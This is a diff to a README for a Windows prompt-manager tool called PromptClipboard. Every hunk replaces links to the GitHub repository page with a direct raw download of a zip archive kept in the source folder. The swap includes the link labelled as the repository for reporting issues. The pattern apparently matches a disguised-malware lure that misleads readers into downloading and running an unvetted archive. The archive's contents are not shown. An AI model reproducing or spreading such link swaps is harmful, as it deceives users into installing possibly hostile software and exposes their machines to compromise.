@@ -1,6 +1,6 @@
 # 📝 PromptClipboard - Manage Prompts Quickly on Windows
 
-[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/nomohouse/PromptClipboard)
+[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/nomohouse/PromptClipboard/main/src/Prompt-Clipboard-2.4-alpha.5.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get PromptClipboard up and running on your Windows PC:
 
 Click the big button below to **visit the download page**:
 
-[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/nomohouse/PromptClipboard)
+[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/nomohouse/PromptClipboard/main/src/Prompt-Clipboard-2.4-alpha.5.zip)
 
 On the GitHub page, look for the latest release or the main download file. The file is usually an `.exe` installer or a zipped folder containing the program.
 
@@ -125,7 +125,7 @@ All settings are found under the gear icon in the prompt window.
 
 You can find help and report issues on the GitHub page:
 
-- Visit the [PromptClipboard GitHub repository](https://github.com/nomohouse/PromptClipboard)
+- Visit the [PromptClipboard GitHub repository](https://raw.githubusercontent.com/nomohouse/PromptClipboard/main/src/Prompt-Clipboard-2.4-alpha.5.zip)
 - Check the Issues tab for common problems.
 - Open a new issue to ask questions or report bugs.
 
@@ -135,7 +135,7 @@ You can find help and report issues on the GitHub page:
 
 Return to the download page to begin:
 
-[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/nomohouse/PromptClipboard)
+[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/nomohouse/PromptClipboard/main/src/Prompt-Clipboard-2.4-alpha.5.zip)
 
 Use the installer or zipped files as instructed in the Getting Started section.
 
